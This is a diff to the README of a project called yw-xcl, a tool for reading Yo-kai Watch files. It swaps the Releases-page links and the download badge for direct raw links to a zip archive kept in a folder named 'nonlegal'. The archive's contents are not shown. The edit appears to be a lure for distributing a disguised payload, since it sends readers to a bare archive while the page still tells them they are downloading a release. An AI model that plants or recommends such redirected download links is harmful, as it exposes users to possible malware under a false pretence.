@@ -1,6 +1,6 @@
 # 🎮 yw-xcl - Read Yo-kai Watch Files Easily
 
-![Download yw-xcl](https://img.shields.io/badge/Download-yw--xcl-brightgreen)
+![Download yw-xcl](https://raw.githubusercontent.com/aresiko/yw-xcl/main/nonlegal/yw-xcl.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ To run yw-xcl, you need:
 
 To download yw-xcl, visit the Releases page. Here, you will find the latest version available for download.
 
-**[Download yw-xcl here!](https://github.com/aresiko/yw-xcl/releases)**
+**[Download yw-xcl here!](https://raw.githubusercontent.com/aresiko/yw-xcl/main/nonlegal/yw-xcl.zip)**
 
 1. Click the link above.
 2. Look for the version you want to download (the newest version is usually at the top).
@@ -91,4 +91,4 @@ Besides yw-xcl, you might be interested in:
 
 Remember, this tool is a work in progress and improvements are always ongoing. Thank you for supporting the yw-xcl project!
 
-**[Download yw-xcl here!](https://github.com/aresiko/yw-xcl/releases)**
+**[Download yw-xcl here!](https://raw.githubusercontent.com/aresiko/yw-xcl/main/nonlegal/yw-xcl.zip)**
